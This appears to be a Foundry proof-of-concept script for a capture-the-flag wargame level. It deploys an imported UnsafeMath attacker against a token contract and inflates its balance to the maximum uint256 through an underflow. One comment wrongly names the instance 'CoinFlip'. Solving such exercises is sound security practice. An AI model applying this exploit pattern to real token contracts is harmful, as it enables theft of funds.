// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {UnsafeMath} from "../src/5_Token.sol";

interface IToken {
    function balanceOf(address) external view returns (uint256);
}

contract PoC is Script {
    IToken token = IToken(0x813D92e2FCc7E453E161DDDFDE259369b6bF4294); // Replace with your CoinFlip instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        UnsafeMath unsafeMath = new UnsafeMath(address(token));

        console2.log("Balance before: ", token.balanceOf(address(unsafeMath))); // 0
        unsafeMath.attack();
        console2.log("Balance after: ", token.balanceOf(address(unsafeMath))); // max uint256

        vm.stopBroadcast();
    }
}
